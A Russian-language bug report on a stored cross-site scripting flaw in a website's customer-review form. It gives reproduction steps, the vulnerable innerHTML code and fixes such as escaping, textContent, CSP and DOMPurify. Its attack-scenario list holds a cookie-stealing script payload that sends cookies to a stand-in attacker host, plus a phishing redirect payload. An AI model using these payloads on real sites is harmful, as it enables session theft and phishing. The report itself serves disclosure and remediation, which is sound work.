КРИТИЧЕСКАЯ УЯЗВИМОСТЬ БЕЗОПАСНОСТИ

Cross-Site Scripting (XSS) уязвимость позволяет злоумышленнику внедрить и выполнить произвольный JavaScript-код в контексте веб-приложения. Это может привести к краже сессионных cookies, перенаправлению на фишинговые сайты, кражу данных и другим атакам.

Описание

В разделе отзывов клиентов не выполняется экранирование HTML-тегов, что позволяет внедрить JavaScript-код. Пользовательский ввод отображается "как есть" без санитизации, что делает возможным выполнение вредоносного скрипта в браузерах других пользователей.

Шаги воспроизведения

  1. Перейти в раздел "Отзывы клиентов".
  2. Нажать кнопку "Оставить отзыв".
  3. В поле "Текст отзыва" ввести: <script>alert('XSS')</script>
  4. Заполнить остальные поля формы.
  5. Отправить отзыв.
  6. Перезагрузить страницу с отзывами или открыть ее в другом браузере.

Демонстрация уязвимости

Ввод пользователя:
<script>alert('XSS Attack!')</script>

Пользователь вводит вредоносный скрипт в поле отзыва.

Отображение на сайте:
// Уязвимый код (без экранирования) document.getElementById('review-content').innerHTML = userReviewText; // "<script>alert('XSS Attack!')</script>" // Результат: выполняется alert('XSS Attack!')

Скрипт выполняется при загрузке страницы.

Ожидаемый результат

Ожидаемый результат

Текст отображается как обычный текст: <script>alert('XSS')</script>. Специальные символы должны быть экранированы для безопасного отображения.

Фактический результат

Фактический результат

Выполняется JavaScript-код. При загрузке страницы с отзывами появляется alert-окно с текстом "XSS".

Возможные сценарии атак

Уровень риска: Высокий - возможность кражи сессий администраторов

  • Кража cookies сессии: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
  • Кражу данных форм: Перехват вводимых пользователем данных (логины, пароли, платежная информация).
  • Перенаправление на фишинговый сайт: <script>window.location='http://phishing-site.com'</script>
  • Кражу токенов аутентификации: Перехват токенов localStorage/sessionStorage.
  • Дефейсинг сайта: Изменение внешнего вида сайта.

Решения и профилактика

  • Экранирование HTML-сущностей: Замена < на &lt;, > на &gt;, & на &amp;, " на &quot;, ' на &#x27;
  • Использование textContent вместо innerHTML: Для безопасного вывода пользовательского контента.
  • Content Security Policy (CSP): Настройка заголовков для запрета выполнения inline-скриптов.
  • Библиотеки санитизации: Использование DOMPurify или аналогичных библиотек для очистки HTML.
  • Валидация на стороне сервера: Проверка и очистка входных данных перед сохранением в БД.
  • HTTP-only cookies: Защита cookies от доступа через JavaScript.

Пример исправления:

// Уязвимый код
function displayReview(reviewText) {
    document.getElementById('review').innerHTML = reviewText;
}

// Исправленный код с экранированием
function displayReview(reviewText) {
    const elem = document.getElementById('review');
    elem.textContent = reviewText; // безопасно
}

// Или с использованием DOMPurify
function displayReview(reviewText) {
    const cleanText = DOMPurify.sanitize(reviewText);
    document.getElementById('review').innerHTML = cleanText;
}

// На стороне сервера (Java пример)
String safeOutput = StringEscapeUtils.escapeHtml4(userInput);
